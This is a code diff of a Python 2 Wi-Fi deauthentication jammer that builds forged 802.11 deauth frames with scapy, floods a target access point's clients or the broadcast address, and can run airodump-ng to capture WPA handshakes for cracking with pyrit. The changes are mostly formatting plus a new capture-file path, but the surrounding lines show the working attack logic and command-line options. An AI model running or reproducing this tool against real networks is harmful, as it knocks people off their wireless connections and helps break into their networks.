@@ -41,17 +41,19 @@ class DeauthJammer(object):
 
         assert type(targets) is types.ListType
 
-        print "Sending packets using interface: "  + scapy.conf.iface
+        print "Sending packets using interface: " + scapy.conf.iface
 
         AnalyzrCore.set_channel(scapy.conf.iface, channel)
 
         proc = None
         capture_prefix = "capture_" + str(time.time())
-        capture_filename = capture_prefix + "-01.cap"        
+        capture_filename = capture_prefix + "-01.cap"
+        capture_filename = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir, "captures", capture_filename))
+
         if capture_handshake:
             FNULL = open(os.devnull, 'w')
             proc = subprocess.Popen(["airodump-ng", "-c", str(channel), "-w", capture_prefix, scapy.conf.iface], stdin=None,
-                                   stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
+                                    stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
 
         for target in targets:
             jamThread = threading.Thread(
@@ -91,7 +93,7 @@ class DeauthJammer(object):
     def _deauth_target(self, target, packet_count):
         broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
         ap_to_client_pckt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
-                                        addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
+                                                           addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
 
         actually_sent = 0
         for n in range(packet_count) or packet_count == -1:
@@ -102,7 +104,7 @@ class DeauthJammer(object):
                 time.sleep(0.1)
 
             scapy.sendp(ap_to_client_pckt)
-            
+
             actually_sent = n
 
         print "Sent " + str(actually_sent + 1) + " packets to " + target
@@ -127,7 +129,8 @@ if __name__ == '__main__':
                             help="Amount of deauth-packages to be sent", metavar="COUNT")
     arg_parser.add_argument("-i, --iface", dest="iface", default="wlan0mon",
                             help="Interface to use for sending deauth-packages", metavar="IFACE")
-    arg_parser.add_argument("--capture", action='store_true', help="deauth_jammer will capture the network traffic during this attack and validate it with pyrit afterwards")
+    arg_parser.add_argument("--capture", action='store_true',
+                            help="deauth_jammer will capture the network traffic during this attack and validate it with pyrit afterwards")
 
     parsed_options = arg_parser.parse_args()
     parsed_options.count = int(parsed_options.count)
@@ -135,7 +138,7 @@ if __name__ == '__main__':
 
     jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
     result = jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count,
-                     channel=parsed_options.channel, capture_handshake=parsed_options.capture)
+                        channel=parsed_options.channel, capture_handshake=parsed_options.capture)
     print ""
     print "=================================================="
     print "Done!"
